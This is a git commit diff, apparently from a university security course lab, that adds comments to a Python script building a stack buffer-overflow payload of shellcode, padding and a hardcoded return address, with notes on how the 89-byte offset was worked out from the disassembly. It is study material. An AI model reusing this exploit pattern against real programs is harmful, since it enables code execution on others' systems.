3e6320df893b83c49cfad90c96f7a96540a1bb8d
mhasan11 <mhasan11@illinois.edu>
2017-09-25 09:36:12 -0400

    done with 2.2.7 and add comment to 2.2.3

--- mp2/2.2.3.py
+++ mp2/2.2.3.py
@@ -5,5 +5,10 @@ from struct import pack
 # EBP = 0xbffef238
 # BuF = 0xbffef1cc
 
+# disassemble vulnerable: lea    -0x6c(%ebp),%eax
+# 0x6c in Hex: 108 in Dec
+# Length of shellcode 23
+# 108 + 4 (for ret) - 23 = 89
+
 add = 0xbffef1cc
 print shellcode + "X"*89 + pack("<I" , add)
